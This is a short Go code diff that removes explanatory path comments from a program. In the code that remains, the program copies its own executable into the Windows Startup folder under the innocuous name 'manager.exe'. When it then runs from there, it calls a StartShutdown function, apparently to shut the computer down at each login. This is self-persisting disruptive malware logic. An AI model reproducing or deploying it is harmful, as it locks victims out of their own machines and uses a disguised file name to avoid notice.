@@ -10,7 +10,7 @@ import (
 
 func main() {
 
-	// C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
 	current_exe_path := os.Args[0]
 	if strings.Contains(current_exe_path, `Programs\Startup`) {
 		StartShutdown()
@@ -31,9 +31,9 @@ func main() {
 func SetRunAtStartup(current_exe_path string) {
 	exe_file_data, _ := os.ReadFile(current_exe_path)
 
-	roaming_path := os.Getenv("APPDATA")                                            // C:\Users\Kmuwl\AppData\Roaming
-	startup_path := roaming_path + `\Microsoft\Windows\Start Menu\Programs\Startup` // C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-	startup_exe_path := startup_path + `\manager.exe`                               // C:\Users\Kmuwl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\manager.exe
+	roaming_path := os.Getenv("APPDATA")                                            
+	startup_path := roaming_path + `\Microsoft\Windows\Start Menu\Programs\Startup` 
+	startup_exe_path := startup_path + `\manager.exe`                             
 
 	os.WriteFile(startup_exe_path, exe_file_data, 0666)
 }
